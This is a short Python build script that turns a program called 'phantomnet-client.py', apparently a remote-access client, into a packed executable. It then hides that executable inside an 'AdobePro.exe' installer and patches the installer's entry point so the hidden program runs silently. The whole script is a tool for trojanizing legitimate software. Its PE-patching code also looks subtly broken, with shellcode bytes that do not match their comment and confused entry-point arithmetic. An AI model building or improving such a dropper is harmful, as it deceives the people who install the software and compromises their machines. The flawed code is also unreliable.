import os
import subprocess
import shutil
from petools import PE

# Define paths
phantomnet_client_py = 'phantomnet-client.py'
adobe_pro_installer = 'AdobePro.exe'
output_dir = 'output'
embedded_exe = os.path.join(output_dir, 'embedded_exe.exe')
resource_hacker_path = 'ResourceHacker.exe'
upx_path = 'upx.exe'

# Step 1: Convert phantomnet-client.py to an executable
print("Converting phantomnet-client.py to an executable...")
subprocess.run(['pyinstaller', '--onefile', phantomnet_client_py, '--distpath', output_dir])
phantomnet_client_exe = os.path.join(output_dir, 'phantomnet-client.exe')

# Step 2: Pack the executable with UPX
print("Packing the executable with UPX...")
subprocess.run([upx_path, phantomnet_client_exe])

# Step 3: Embed the executable into AdobePro.exe installer
print("Embedding the executable into AdobePro.exe installer...")
subprocess.run([resource_hacker_path, '-add', adobe_pro_installer, embedded_exe, 'EXE', 'EMBEDDED_EXE'])

# Step 4: Modify AdobePro.exe to run the embedded executable silently
print("Modifying AdobePro.exe to run the embedded executable silently...")
with open(adobe_pro_installer, 'rb') as f:
    adobe_pro_data = f.read()

# Load the PE file
pe = PE(adobe_pro_data)

# Find the address of the embedded executable
embedded_exe_address = pe.get_resource_data('EMBEDDED_EXE')

# Insert the code to run the embedded executable at the start of AdobePro.exe
# This example assumes the embedded executable is a valid PE file and can be called directly
# You may need to adjust the assembly code based on the actual binary structure
assembly_code = b'\x55\x8B\xEC\xE8\x00\x00\x00\x00\x5D\xC2\x04\x00'  # Push EBP, MOV EBP, ESP, CALL [embedded_exe_address], POP EBP, RET 4

# Patch the entry point to call the embedded executable
pe.entry_point = pe.rva_to_offset(pe.entry_point) + len(assembly_code)
pe.write(pe.entry_point, assembly_code)

# Write the modified PE data back to the file
with open(adobe_pro_installer, 'wb') as f:
    f.write(pe.data())

print("Build script completed successfully.")
